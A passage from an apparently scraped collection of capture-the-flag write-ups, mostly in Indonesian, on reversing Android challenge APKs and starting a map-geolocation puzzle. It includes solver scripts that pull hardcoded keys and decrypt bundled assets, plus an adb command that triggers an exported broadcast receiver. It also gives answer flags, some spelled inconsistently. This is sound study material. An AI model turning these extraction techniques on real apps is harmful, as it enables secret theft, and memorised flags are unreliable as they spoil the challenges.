        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover the master shard from the APK's leftover native source and DB.\"\"\"\r\n\r\nimport hashlib\r\nimport re\r\nimport sqlite3\r\nfrom pathlib import Path\r\n\r\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\r\n\r\n\r\nROOT = Path(__file__).resolve().parent\r\nSOURCE = ROOT / \"extracted\" / \"libshard.c\"\r\nDATABASE = ROOT / \"extracted\" / \"assets\" / \"shard.db\"\r\n\r\n\r\ndef main() -> None:\r\n    native = SOURCE.read_text()\r\n    fragments = {\r\n        int(index): value\r\n        for index, value in re.findall(r'sk_f(\\d+)\\s*=\\s*\"SKFRAG\\d+:([^\"]*)\"', native)\r\n    }\r\n    order_text = re.search(r'sk_order\\s*=\\s*\"seq=([0-9,]+)\"', native).group(1)\r\n    order = [int(item) for item in order_text.split(\",\")]\r\n    payload = \"\".join(fragments[index] for index in order).encode()\r\n    key = hashlib.sha256(payload).digest()\r\n\r\n    with sqlite3.connect(DATABASE) as db:\r\n        name, iv, tag, ciphertext, context = db.execute(\r\n            \"SELECT name, iv, tag, ciphertext, context \"\r\n            \"FROM shard WHERE name = 'master_shard'\"\r\n        ).fetchone()\r\n\r\n    plaintext = AESGCM(key).decrypt(\r\n        bytes.fromhex(iv), bytes.fromhex(ciphertext + tag), context.encode()\r\n    )\r\n    print(plaintext.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{obsidian_cold_blade_forged_from_native_shards}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-mobile-losilluminados",
    "title": "LosIlluminados",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge LosIlluminados",
    "problemDescription": "Flag ada di asset `assets/illuminados_signal.bin`, bukan di `NOTICE.txt`. APK menyimpan receiver `los.illuminados.IlluminadosReceiver` yang hanya aktif untuk action `com.los.illuminados.RECEIVE`. Receiver membaca signal bundle, mengambil payload setelah header, menurunkannya dengan key dari HMAC-SHA256, lalu menulis plaintext ke `Log.d(\"LosIlluminados\", ...)`.\n\nHasil decrypt berupa JSON:\n\n```json\n{\"channel\":\"los/illuminados/primary\",\"seq\":13,\"flag\":\"0xV0ID{l0s_1llum1n4d0s_h4v3_sp0tt3d_y0u}\",\"auth\":\"verified\"}\n```",
    "tools": [],
    "analysis": "Identifikasi awal:\n\n```bash\nfile *\nunzip -l LosIlluminados.apk\nstrings -a apk/classes.dex\n```\n\n`file` menunjukkan APK Android dengan `classes.dex`. Dari `strings` di `classes.dex` terlihat string penting:\n\n```\nHmacSHA256\nLlos/illuminados/IlluminadosDecoder;\nLlos/illuminados/IlluminadosReceiver;\ndecryptBundle\nderiveKey\nonReceive\nilluminados_signal.bin\ncom.los.\nilluminados.\nRECEIVE\n|Illuminados\nReceiver\n```\n\nAsset signal punya format awal:\n\n```\n4c 4f 53 49 4c 01 00 ...\nL  O  S  I  L  01 00\n```\n\nJadi header bundle:\n\n```\nmagic   = \"LOSIL\"\nversion = 0x01\nreserved/unused byte = 0x00\npayload dimulai offset 7\n```\n\nAPK kecil, jadi `classes.dex` bisa dibaca langsung. Dua class yang relevan:\n\n```\nlos.illuminados.IlluminadosReceiver\nlos.illuminados.IlluminadosDecoder\n```\n\nManifest menunjukkan package app:\n\n```\nlos.illuminados\n```\n\nReceiver class:\n\n```\nlos.illuminados.IlluminadosReceiver\n```\n\nIntent action:\n\n```\ncom.los.illuminados.RECEIVE\n```\n\nAlur `onReceive()`:\n\n```\nintent.getAction()\ncek action == \"com.los.illuminados.RECEIVE\"\nderiveKey(context)\nbuka assets/illuminados_signal.bin\ncek byte[5] == 1\ncopy payload dari offset 7 sampai akhir\ndecryptBundle(payload, key)\nnew String(plaintext)\nLog.d(\"LosIlluminados\", plaintext)\n```\n\n`deriveKey(context)` membangun dua string:\n\n```\nmessage  = context.getPackageName() + \"|Illuminados\" + \"Receiver\"\nhmac_key = \"com.los.\" + \"illuminados.\" + \"RECEIVE\"\n```\n\nDengan package dari manifest, nilainya menjadi:\n\n```\nmessage  = \"los.illuminados|IlluminadosReceiver\"\nhmac_key = \"com.los.illuminados.RECEIVE\"\n```\n\nKey final:\n\n```\nHMAC-SHA256(key=hmac_key, msg=message)\n```\n\n`decryptBundle(payload, key)` melakukan dua tahap:\n\n```\n1. Pair-swap payload:\n   out[i]   = payload[i + 1]\n   out[i+1] = payload[i]\n   untuk i = 0, 2, 4, ...\n\n2. XOR semua byte hasil swap dengan key berulang:\n   plaintext[i] = swapped[i] ^ key[i % 32]\n```\n\nAPK tidak perlu dijalankan di emulator. Receiver hanya membaca asset lokal dan menulis hasil decrypt ke Android log. Logic itu direplikasi di `solve.py` supaya prosesnya bisa dijalankan ulang langsung dari APK.\n\nValidasi lokal:\n\n```bash\n./solve.py\n```\n\nOutput:\n\n```\n{\"channel\":\"los/illuminados/primary\",\"seq\":13,\"flag\":\"0xV0ID{l0s_1llum1n4d0s_h4v3_sp0tt3d_y0u}\",\"auth\":\"verified\"}\n0xV0ID{l0s_1llum1n4d0s_h4v3_sp0tt3d_y0u}\n```\n\nPlaintext JSON punya field `auth` bernilai `verified`, jadi ini bukan decoy dari `NOTICE.txt`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "File utama:\n\n```\nLosIlluminados.apk\n```\n\nIsi APK:\n\n```\nclasses.dex\nAndroidManifest.xml\nresources.arsc\nassets/NOTICE.txt\nassets/illuminados_signal.bin\nMETA-INF/DEBUG.SF\nMETA-INF/DEBUG.RSA\nMETA-INF/MANIFEST.MF\n```\n\n`NOTICE.txt` berisi decoy:\n\n```\n0xV0ID{the_notice_file_is_a_trap}\n```\n\nFlag itu tidak valid karena app sendiri memakai asset `illuminados_signal.bin`."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Tidak ada input flag yang divalidasi user. Challenge ini menyembunyikan flag sebagai encrypted signal bundle.\n\nFormat bundle:\n\n```\noffset 0..4  : magic \"LOSIL\"\noffset 5     : version, harus 1\noffset 6     : byte tidak dipakai oleh receiver\noffset 7..N  : ciphertext\n```\n\nKey derivation:\n\n```python\nkey = HMAC_SHA256(\n    key=b\"com.los.illuminados.RECEIVE\",\n    msg=b\"los.illuminados|IlluminadosReceiver\"\n)\n```\n\nDecrypt:\n\n```python\nswapped = pair_swap(ciphertext)\nplaintext = swapped XOR repeating_key\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` dibuat supaya membaca APK langsung, tanpa perlu ekstrak manual:\n\n1. Buka `LosIlluminados.apk` dengan `zipfile`.\n2. Parse package name dari binary `AndroidManifest.xml`.\n3. Ambil `assets/illuminados_signal.bin`.\n4. Validasi magic `LOSIL` dan version `1`.\n5. Turunkan HMAC key sesuai logic `deriveKey()`.\n6. Jalankan pair-swap + XOR sesuai `decryptBundle()`.\n7. Parse JSON dan cetak field `flag`."
      },
      {
        "title": "Cara Menjalankan",
        "content": "Dari folder challenge:\n\n```bash\nchmod +x solve.py\n./solve.py\n```\n\nAtau:\n\n```bash\npython3 solve.py\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport hashlib\r\nimport hmac\r\nimport json\r\nimport struct\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nAPK_PATH = Path(__file__).with_name(\"LosIlluminados.apk\")\r\nMAGIC = b\"LOSIL\"\r\nEXPECTED_VERSION = 1\r\n\r\n\r\ndef u16(buf, off):\r\n    return struct.unpack_from(\"<H\", buf, off)[0]\r\n\r\n\r\ndef u32(buf, off):\r\n    return struct.unpack_from(\"<I\", buf, off)[0]\r\n\r\n\r\ndef read_utf16_length(buf, off):\r\n    \"\"\"Android string-pool UTF-16 length. Handles the short and extended forms.\"\"\"\r\n    first = u16(buf, off)\r\n    off += 2\r\n    if first & 0x8000:\r\n        second = u16(buf, off)\r\n        off += 2\r\n        length = ((first & 0x7FFF) << 16) | second\r\n    else:\r\n        length = first\r\n    return length, off\r\n\r\n\r\ndef parse_manifest_package(manifest: bytes) -> str:\r\n    \"\"\"Minimal binary AndroidManifest parser: read string pool, then manifest tag attrs.\"\"\"\r\n    # AXML header: type/header_size/chunk_size, then the string pool chunk starts.\r\n    string_pool_off = 8\r\n    if u16(manifest, string_pool_off) != 0x0001:\r\n        raise ValueError(\"String pool chunk not found in AndroidManifest.xml\")\r\n\r\n    sp_header_size = u16(manifest, string_pool_off + 2)\r\n    sp_size = u32(manifest, string_pool_off + 4)\r\n    string_count = u32(manifest, string_pool_off + 8)\r\n    flags = u32(manifest, string_pool_off + 16)\r\n    strings_start = u32(manifest, string_pool_off + 20)\r\n    is_utf8 = bool(flags & 0x00000100)\r\n    if is_utf8:\r\n        raise ValueError(\"This solve parser expects UTF-16 manifest strings\")\r\n\r\n    offsets_base = string_pool_off + sp_header_size\r\n    strings_base = string_pool_off + strings_start\r\n    strings = []\r\n    for i in range(string_count):\r\n        rel = u32(manifest, offsets_base + i * 4)\r\n        pos = strings_base + rel\r\n        length, pos = read_utf16_length(manifest, pos)\r\n        raw = manifest[pos : pos + length * 2]\r\n        strings.append(raw.decode(\"utf-16le\"))\r\n\r\n    off = string_pool_off + sp_size\r\n    while off + 8 <= len(manifest):\r\n        chunk_type = u16(manifest, off)\r\n        chunk_size = u32(manifest, off + 4)\r\n        if chunk_type == 0x0102:  # RES_XML_START_ELEMENT_TYPE\r\n            name_idx = u32(manifest, off + 20)\r\n            tag_name = strings[name_idx]\r\n            attr_start = u16(manifest, off + 24)\r\n            attr_size = u16(manifest, off + 26)\r\n            attr_count = u16(manifest, off + 28)\r\n            attrs_base = off + 16 + attr_start\r\n            if tag_name == \"manifest\":\r\n                for j in range(attr_count):\r\n                    a = attrs_base + j * attr_size\r\n                    attr_name = strings[u32(manifest, a + 4)]\r\n                    raw_value_idx = u32(manifest, a + 8)\r\n                    value_type = manifest[a + 15]\r\n                    value_data = u32(manifest, a + 16)\r\n                    if attr_name == \"package\":\r\n                        if raw_value_idx != 0xFFFFFFFF:\r\n                            return strings[raw_value_idx]\r\n                        if value_type == 0x03:  # TYPE_STRING\r\n                            return strings[value_data]\r\n        if chunk_size <= 0:\r\n            break\r\n        off += chunk_size\r\n    raise ValueError(\"package attribute not found\")\r\n\r\n\r\ndef derive_key(package_name: str) -> bytes:\r\n    # From IlluminadosDecoder.deriveKey():\r\n    # key material = \"com.los.\" + \"illuminados.\" + \"RECEIVE\"\r\n    # message      = packageName + \"|Illuminados\" + \"Receiver\"\r\n    hmac_key = b\"com.los.illuminados.RECEIVE\"\r\n    message = f\"{package_name}|IlluminadosReceiver\".encode()\r\n    return hmac.new(hmac_key, message, hashlib.sha256).digest()\r\n\r\n\r\ndef decrypt_bundle(ciphertext: bytes, key: bytes) -> bytes:\r\n    # From IlluminadosDecoder.decryptBundle(): pair-swap first, then XOR with key stream.\r\n    swapped = bytearray(len(ciphertext))\r\n    for i in range(0, len(ciphertext) - 1, 2):\r\n        swapped[i] = ciphertext[i + 1]\r\n        swapped[i + 1] = ciphertext[i]\r\n    if len(ciphertext) % 2:\r\n        swapped[-1] = ciphertext[-1]\r\n\r\n    return bytes(b ^ key[i % len(key)] for i, b in enumerate(swapped))\r\n\r\n\r\ndef main():\r\n    with zipfile.ZipFile(APK_PATH) as apk:\r\n        manifest = apk.read(\"AndroidManifest.xml\")\r\n        signal = apk.read(\"assets/illuminados_signal.bin\")\r\n\r\n    package_name = parse_manifest_package(manifest)\r\n\r\n    if signal[:5] != MAGIC:\r\n        raise ValueError(\"Bad signal magic\")\r\n    if signal[5] != EXPECTED_VERSION:\r\n        raise ValueError(f\"Unsupported signal version: {signal[5]}\")\r\n\r\n    ciphertext = signal[7:]\r\n    plaintext = decrypt_bundle(ciphertext, derive_key(package_name))\r\n    decoded = json.loads(plaintext.decode())\r\n\r\n    print(plaintext.decode())\r\n    print(decoded[\"flag\"])\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{l0s_1llum1n4d0s_h4v3_sp0tt3d_y0u}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-mobile-mawjrelay",
    "title": "Mawj Relay",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Mawj Relay",
    "problemDescription": "APK kecil ini menyamarkan data notifikasi di `assets/push_routes.bin`. File\nlainnya berisi decoy: `README_NOTE.txt`, `debug_flag`, dan DEX palsu.",
    "tools": [],
    "analysis": "Manifest mendefinisikan package `void.mobile.echopush`, label `EchoPush`, dan\nreceiver untuk action `com.void.echo.PUSH`. APK tidak memakai kompresi ZIP.\n\n`classes.dex` hanya berisi header DEX dan string decoy, tetapi struktur DEX-nya\ntidak valid sehingga tidak dapat didecompile. `README_NOTE.txt` secara\neksplisit menyatakan dirinya decoy. Resource juga memberi petunjuk:\n\n```text\nkey = sha256(action + ':' + label)\n```\n\n`push_routes.bin` diawali dengan:\n\n```text\nVPUSH1 00 00 81\n```\n\nByte `0x81` menyatakan panjang payload terenkripsi, yaitu 129 byte. Empat byte\nsetelah payload adalah checksum CRC32 big-endian.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `kizcjo.apk`\n- `assets/push_routes.bin` setelah ekstraksi APK"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Key dihitung dari data manifest/resource:\n\n```text\nsha256(\"com.void.echo.PUSH:EchoPush\")\n```\n\nPayload di-XOR dengan key tersebut secara berulang setiap 32 byte. Hasilnya\nadalah JSON:\n\n```json\n{\"route\":\"prod/receiver/primary\",\"priority\":42,\"flag\":\"0xV01D{push_receiver_xor_is_not_crypto}\",\"crc32\":\"verified after decrypt\"}\n```\n\nCRC32 plaintext adalah `07ae8260`, sama dengan checksum yang tersimpan di\nasset, sehingga hasil dekripsi tervalidasi."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca asset, mengambil panjang payload, menghitung SHA-256 key,\nmelakukan repeating-key XOR, memeriksa CRC32, lalu mengambil field `flag` dari\nJSON."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nunzip -q kizcjo.apk -d extracted\npython3 solve.py\n```"
      },
      {
        "title": "Catatan",
        "content": "Flag pada `README_NOTE.txt`, `debug_flag`, dan `FAKE_FLAG` di DEX adalah decoy\ndan tidak digunakan oleh payload route yang tervalidasi."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Decode the hidden push route from assets/push_routes.bin.\"\"\"\r\n\r\nimport hashlib\r\nimport json\r\nimport struct\r\nimport zlib\r\nfrom pathlib import Path\r\n\r\n\r\nACTION = \"com.void.echo.PUSH\"\r\nLABEL = \"EchoPush\"\r\n\r\n\r\ndef main() -> None:\r\n    blob = Path(__file__).with_name(\"extracted\").joinpath(\r\n        \"assets\", \"push_routes.bin\"\r\n    ).read_bytes()\r\n    assert blob[:6] == b\"VPUSH1\"\r\n\r\n    payload_len = blob[8]\r\n    encrypted = blob[9 : 9 + payload_len]\r\n    stored_crc = blob[9 + payload_len : 13 + payload_len]\r\n\r\n    key = hashlib.sha256(f\"{ACTION}:{LABEL}\".encode()).digest()\r\n    plaintext = bytes(value ^ key[index % len(key)] for index, value in enumerate(encrypted))\r\n\r\n    assert struct.unpack(\">I\", stored_crc)[0] == zlib.crc32(plaintext)\r\n    record = json.loads(plaintext)\r\n    print(record[\"flag\"])\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{push_receiver_xor_is_not_crypto}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-mobile-pingback",
    "title": "PingBack",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge PingBack",
    "problemDescription": "`PingBack.apk` punya `BroadcastReceiver` exported bernama `com.pingback.app.UnlockReceiver`. Receiver ini mengambil extra `auth` dan `seq`, memvalidasinya, lalu membuat key AES dari gabungan dua nilai tersebut. Kalau valid, receiver membaca `assets/signal.enc`, decrypt AES-CBC, dan menulis plaintext ke log tag `PingBack`.\n\nFlag valid:\n\n```\n0xV0ID{p1ng_b4ck_r3c31v3r_unl0ck3d_v14_1nt3nt}\n```",
    "tools": [],
    "analysis": "Pemeriksaan awal:\n\n```bash\nfile *\nstrings -a ./PingBack.apk | head -n 100\nstrings -a classes.dex\nstrings -el AndroidManifest.xml\n```\n\nTemuan string penting dari `classes.dex`:\n\n```\nAES/CBC/PKCS5Padding\nSHA-1\nSYNC-2026\n-PING\nauth\nseq\nsignal.enc\nauth_denied\ndecrypt_failed\nPingBack\n```\n\nManifest binary XML berisi receiver dan action:\n\n```\ncom.pingback.app\n.UnlockReceiver\ncom.pingback.ACTION_UNLOCK\nexported\n```\n\nJadi receiver bisa dipanggil dengan broadcast intent action `com.pingback.ACTION_UNLOCK`.\n\nDEX kecil, jadi cukup diparse/disassemble manual. Class utama yang penting:\n\n```\nLcom/pingback/app/UnlockReceiver;\n```\n\nMethod yang relevan:\n\n```\ngetExpectedAuth()\ngetExpectedSeq()\nonReceive(Context, Intent)\n<clinit>()\n```\n\n`getExpectedAuth()`:\n\n```java\nreturn \"SYNC-2026\".concat(\"-PING\");\n```\n\nJadi nilai `auth` yang benar:\n\n```\nSYNC-2026-PING\n```\n\n`getExpectedSeq()`:\n\n```java\nint v0 = 12;\nv0 = v0 + (-1);\nreturn v0;\n```\n\nJadi nilai `seq` yang benar:\n\n```\n11\n```\n\n`<clinit>()` mengisi static field `IV` dengan payload `fill-array-data`:\n\n```\n0f 1e 2d 3c 4b 5a 69 78 87 96 a5 b4 c3 d2 e1 f0\n```\n\nReceiver bisa dipanggil di device/emulator dengan:\n\n```bash\nadb shell am broadcast \\\n  -a com.pingback.ACTION_UNLOCK \\\n  -n com.pingback.app/.UnlockReceiver \\\n  --es auth SYNC-2026-PING \\\n  --ei seq 11\n\nadb logcat -s PingBack:D\n```\n\nTanpa emulator, alurnya bisa direproduksi lokal karena ciphertext `signal.enc`, IV, dan proses derivasi key sudah jelas dari bytecode.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```\nPingBack.apk\n```\n\nIsi APK:\n\n```\nclasses.dex\nAndroidManifest.xml\nresources.arsc\nassets/signal.enc\nMETA-INF/*\n```\n\n`assets/signal.enc` berukuran 48 byte dan merupakan ciphertext AES-CBC dengan padding PKCS#5/PKCS#7."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Alur `onReceive()`:\n\n1. Ambil string extra `auth`, default `\"\"`.\n2. Ambil integer extra `seq`, default `0`.\n3. Bandingkan `auth` dengan `getExpectedAuth()`.\n4. Bandingkan `seq` dengan `getExpectedSeq()`.\n5. Kalau salah, log `auth_denied`.\n6. Kalau benar, buat material key:\n\n```\nSYNC-2026-PING11\n```\n\n7. Hitung SHA-1 dari material key.\n8. Ambil 16 byte pertama sebagai AES-128 key.\n9. Decrypt `assets/signal.enc` dengan:\n\n```\nAES/CBC/PKCS5Padding\nIV = 0f1e2d3c4b5a69788796a5b4c3d2e1f0\n```\n\nHasil plaintext inilah yang dilog ke tag `PingBack`."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca `assets/signal.enc` langsung dari `PingBack.apk`, menghitung key dari `SHA1(b\"SYNC-2026-PING11\")[:16]`, lalu decrypt AES-CBC memakai IV dari `<clinit>()`.\n\nScript mendukung beberapa environment:\n\n1. `cryptography`, kalau tersedia.\n2. `PyCryptodome`, kalau tersedia.\n3. `openssl` CLI sebagai fallback."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\ncd /mnt/data/PingBack\npython3 solve.py\n```\n\nOutput:\n\n```\n0xV0ID{p1ng_b4ck_r3c31v3r_unl0ck3d_v14_1nt3nt}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport hashlib\r\nimport subprocess\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nAPK_PATH = Path(\"PingBack.apk\")\r\nASSET_NAME = \"assets/signal.enc\"\r\n\r\n# Nilai ini hasil reverse dari UnlockReceiver:\r\n# getExpectedAuth() = \"SYNC-2026\".concat(\"-PING\")\r\n# getExpectedSeq()  = 12 - 1\r\nAUTH = \"SYNC-2026-PING\"\r\nSEQ = 11\r\n\r\n# IV diinisialisasi di <clinit> via fill-array-data payload.\r\nIV = bytes.fromhex(\"0f1e2d3c4b5a69788796a5b4c3d2e1f0\")\r\n\r\n\r\ndef pkcs7_unpad(data: bytes) -> bytes:\r\n    pad = data[-1]\r\n    if pad < 1 or pad > 16 or data[-pad:] != bytes([pad]) * pad:\r\n        raise ValueError(\"invalid PKCS#7 padding\")\r\n    return data[:-pad]\r\n\r\n\r\ndef read_signal() -> bytes:\r\n    # Bisa membaca dari APK langsung, jadi tidak wajib unzip dulu.\r\n    with zipfile.ZipFile(APK_PATH, \"r\") as zf:\r\n        return zf.read(ASSET_NAME)\r\n\r\n\r\ndef decrypt_with_python_libs(key: bytes, iv: bytes, ct: bytes) -> bytes | None:\r\n    # Prefer cryptography kalau ada.\r\n    try:\r\n        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\n\r\n        dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()\r\n        return dec.update(ct) + dec.finalize()\r\n    except Exception:\r\n        pass\r\n\r\n    # Fallback PyCryptodome kalau environment user punya Crypto.\r\n    try:\r\n        from Crypto.Cipher import AES\r\n\r\n        return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)\r\n    except Exception:\r\n        return None\r\n\r\n\r\ndef decrypt_with_openssl(key: bytes, iv: bytes, ct: bytes) -> bytes:\r\n    proc = subprocess.run(\r\n        [\r\n            \"openssl\",\r\n            \"enc\",\r\n            \"-d\",\r\n            \"-aes-128-cbc\",\r\n            \"-K\",\r\n            key.hex(),\r\n            \"-iv\",\r\n            iv.hex(),\r\n        ],\r\n        input=ct,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.PIPE,\r\n        check=True,\r\n    )\r\n    # openssl sudah menghapus PKCS#7 padding secara default.\r\n    return proc.stdout\r\n\r\n\r\ndef main() -> None:\r\n    material = f\"{AUTH}{SEQ}\".encode()\r\n    key = hashlib.sha1(material).digest()[:16]\r\n    ct = read_signal()\r\n\r\n    pt = decrypt_with_python_libs(key, IV, ct)\r\n    if pt is not None:\r\n        pt = pkcs7_unpad(pt)\r\n    else:\r\n        pt = decrypt_with_openssl(key, IV, ct)\r\n\r\n    flag = pt.decode(\"utf-8\")\r\n    print(flag)\r\n    print()\r\n    print(\"Intent untuk trigger receiver:\")\r\n    print(\r\n        \"adb shell am broadcast \"\r\n        \"-a com.pingback.ACTION_UNLOCK \"\r\n        \"-n com.pingback.app/.UnlockReceiver \"\r\n        f\"--es auth {AUTH} --ei seq {SEQ}\"\r\n    )\r\n    print(\"adb logcat -s PingBack:D\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    if not APK_PATH.exists():\r\n        sys.exit(f\"missing {APK_PATH}\")\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{p1ng_b4ck_r3c31v3r_unl0ck3d_v14_1nt3nt}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-mobile-voidenote",
    "title": "VoidNotes",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge VoidNotes",
    "problemDescription": "Flag disimpan di `assets/secret_note.bin`. File tersebut bukan enkripsi yang kuat: aplikasi hanya melakukan XOR satu byte dengan konstanta `0x55`.",
    "tools": [],
    "analysis": "`file` mengidentifikasi `VoidNotes.apk` sebagai Android package. Isi APK terdiri dari `AndroidManifest.xml`, `resources.arsc`, `classes.dex`, dan `assets/secret_note.bin` berukuran 34 byte.\n\nStrings pada resource menyebut `NoteDecryptor.java` dan asset `assets/secret_note.bin`. Manifest menunjukkan activity utama `com.voidnotes.MainActivity`.\n\nDEX dapat didekompilasi dengan JADX. `MainActivity` memasang handler tombol `Decrypt Secret Note` yang menjalankan:\n\n```java\nNoteDecryptor.decrypt(NoteDecryptor.readAsset(mainActivity, \"secret_note.bin\"))\n```\n\nImplementasi `NoteDecryptor.decrypt()` adalah:\n\n```java\npublic static final int KEY = 85;\n\nfor (int i = 0; i < encrypted.length; i++) {\n    decrypted[i] = (byte) (encrypted[i] ^ 85);\n}\n```\n\nKonstanta 85 sama dengan `0x55`. Tidak ada validasi tambahan atau key derivation.\n\nAsset diekstrak dan di-XOR dengan `0x55`. Hasilnya berupa teks UTF-8:\n\n```text\n0xV0ID{h4rdc0d3d_4ss3ts_4r3_tr4sh}\n```\n\nHasil ini juga direproduksi oleh `solve.py` yang membaca asset langsung dari APK.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `VoidNotes.apk` — Android APK berisi DEX, manifest, resource, dan asset rahasia."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Untuk setiap byte ciphertext `c`, plaintext dihitung dengan:\n\n```text\np = c XOR 0x55\n```\n\nXOR bersifat involutif, sehingga operasi yang sama juga dapat dipakai untuk membalikkan encoding."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membuka `VoidNotes.apk` sebagai ZIP, membaca `assets/secret_note.bin`, menerapkan XOR `0x55` pada setiap byte, lalu mendecode hasilnya sebagai UTF-8."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py\n```"
      },
      {
        "title": "Catatan",
        "content": "Klaim bahwa note terenkripsi aman terbantahkan karena key dan seluruh algoritma berada di `classes.dex`, sedangkan ciphertext berada sebagai asset yang dapat dibaca langsung dari APK."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover the developer note from VoidNotes.apk.\"\"\"\r\n\r\nfrom pathlib import Path\r\nfrom zipfile import ZipFile\r\n\r\n\r\ndef main() -> None:\r\n    apk = Path(__file__).with_name(\"VoidNotes.apk\")\r\n    with ZipFile(apk) as archive:\r\n        encrypted = archive.read(\"assets/secret_note.bin\")\r\n\r\n    # NoteDecryptor.decrypt(): each asset byte is XORed with 0x55.\r\n    flag = bytes(byte ^ 0x55 for byte in encrypted).decode(\"utf-8\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{h4rdc0d3d_4ss3ts_4r3_tr4sh}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-osint-mapdetective",
    "title": "Map Detective",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Map Detective",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge hanya memberikan sebuah street-level image tanpa metadata atau nama lokasi yang terlihat dengan jelas.\n\nKarena itu, langkah pertama adalah melakukan **visual geolocation** dengan menginventarisasi objek yang dapat digunakan sebagai clue.\n\nBeberapa karakteristik penting dari gambar:\n\n* Jalan lebar di daerah perkotaan.\n* Banyak pohon palem tinggi di sepanjang jalan.\n* Cuaca dan vegetasi terlihat khas kawasan Mediterania.\n* Terdapat area yang tampak seperti kawasan pantai atau maritime district.\n* Marka jalan dan arsitektur terlihat khas Eropa.\n* Di sisi kanan terdapat bangunan besar berwarna putih dengan gaya klasik/neoklasik.\n* Bangunan memiliki kolom besar, cornice, balustrade, serta tower pada bagian sudut.\n* Lingkungan di sekitarnya tampak seperti kawasan resort atau promenade tepi laut.\n\nClue paling berguna bukan pohon palemnya, karena karakteristik tersebut terlalu umum, melainkan **bangunan putih besar di sisi kanan gambar**.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "**Category:** OSINT / Geolocation\n**Challenge:** Map Detective\n\n### Description\n\n> Look closely at the maritime views. Find the coordinates.\n\nFlag format:\n\n```text\n0xV0ID{xx.xxx,xx.xxx}\n```\n\nConfirmed accepted flag:\n\n```text\n0xV01D{39.466,-0.324}\n```\n\n---"
      },
      {
        "title": "2. Identifying the Country",
        "content": "Dari kombinasi:\n\n```text\nMediterranean architecture\n+ palm-lined boulevard\n+ maritime environment\n+ European road layout\n```\n\nwilayah pencarian dapat dipersempit ke kota-kota pesisir Mediterania.\n\nBeberapa kandidat awal yang masuk akal antara lain:\n\n```text\nSpain\nPortugal\nSouthern France\nItaly\n```\n\nNamun gaya lingkungan perkotaan dan promenade paling konsisten dengan pesisir timur **Spanyol**.\n\nSelanjutnya pencarian difokuskan pada kota-kota pesisir Spanyol.\n\n---"
      },
      {
        "title": "3. Identifying the Landmark",
